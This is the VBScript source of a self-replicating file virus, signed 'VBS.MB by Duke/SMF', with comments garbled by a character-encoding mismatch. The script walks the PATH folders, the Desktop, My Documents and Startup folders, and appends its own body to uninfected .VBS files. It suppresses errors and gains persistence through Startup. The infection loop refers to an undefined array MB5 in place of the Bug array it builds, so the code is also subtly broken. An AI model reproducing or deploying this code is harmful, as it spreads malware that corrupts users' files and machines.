'^
On Error Resume Next
Dim FSO, Vir, SI
Dim Bug(200)                         '���ᨢ �� ��ப ��� ᯨ᪠ ��⠫����
Dim TP                               '⥪��� ������ �祩�� � ���ᨢ�

Set WSHShell = Wscript.CreateObject("Wscript.Shell")
Set WshSysEnv = WSHShell.Environment("Process")
MB11 = WshSysEnv("Path")                       '��६����� ���㦥��� PATH
Set FSO = CreateObject("Scripting.FileSystemObject")
FN = Wscript.ScriptFullName                    '���� �� ⥪�饣� 䠩��

' ������� ���ᨢ Bug � ᯨ᪮� ��⠫���� ���
' SI - ᨬ���
TP = 1
For x = Len(MB11) To 1 Step -1
   SI = Mid(MB11, x, 1)
   If SI <> ";" Then
     Bug(TP) = SI + Bug(TP)
   ElseIf SI = ";" Then
     Bug(TP) = Bug(TP) + "\"
     TP = TP + 1
   End If
Next
Bug(TP) = Bug(TP) + "\"
Bug(TP + 1) = WSHShell.SpecialFolders("Desktop") + "\"
Bug(TP + 2) = WSHShell.SpecialFolders("MyDocuments") + "\"
Bug(TP + 3) = WSHShell.SpecialFolders("Startup") + "\"
Bug(TP + 4) = Left(FN, InStrRev(FN, "\"))

'Buf - ���� ��� ⥫� �����
'Met - ��⪠ ��砫� �����
'Vir - ���� �����
Set TS = FSO.OpenTextFile(FN, 1)      '���뫨 ��� �⥭�� 䠩� � ����ᮬ
Buf = TS.ReadAll                      '��⠫� 䠩� � Buf
TS.Close                              '����뫨 䠩�
Met = Chr(94)                         '��⪠ ��� �஢�ન
endMet = "'" & Met                    '������ ��砫쭠� ��⪠
For x = Len(Buf) To 1 Step -1         '��稭�� � ���� �஢��塞 Buf
   If Mid(Buf, x, 1) = Met Then       '�᫨ ��諨 �� ��⪨, � ����� �뤥���
      x = 1
      Vir = endMet + Vir
   ElseIf Mid(Buf, x, 1) <> Met Then  '�᫨ �� ��⪨ �� ��諨, � ������塞
      Vir = Mid(Buf, x, 1) + Vir      '⥪�騩 ᨬ��� � ⥫� �����
   End If
Next

'TS   - ��ࠦ���� 䠩�
'Body - ⥫� �����
For y = 1 To (TP + 4)                                      '��ॡ�� ᯨ᪠ ��⠫����
   For Each Target In FSO.GetFolder(MB5(y)).Files          '��ॡ�� ��� 䠩��� � ��⠫���
   If UCase(Right(Target.Name, 3)) = "VBS" Then            '�᫨ *.VBS
      Body = ""
      Set TS = FSO.OpenTextFile(MB5(y) & Target.Name, 1)   '���뫨 ��� �⥭��
      Body = TS.ReadAll                                    '��⠫� ⥫� �����
      TS.Close                                             '����뫨 �����
      If mid(Body,len(Body),1) <> "F" Then                 '�஢��塞 ����� �� ��ࠦ�������
        Set TS = FSO.OpenTextFile(MB5(y) & Target.Name, 8) '���뫨 ��� ����������
        TS.Write Vir                                       '����ᠫ� �����
        TS.Close                                           '����뫨 �����
      End If
   End If
   Next
Next
'VBS.MB by Duke/SMF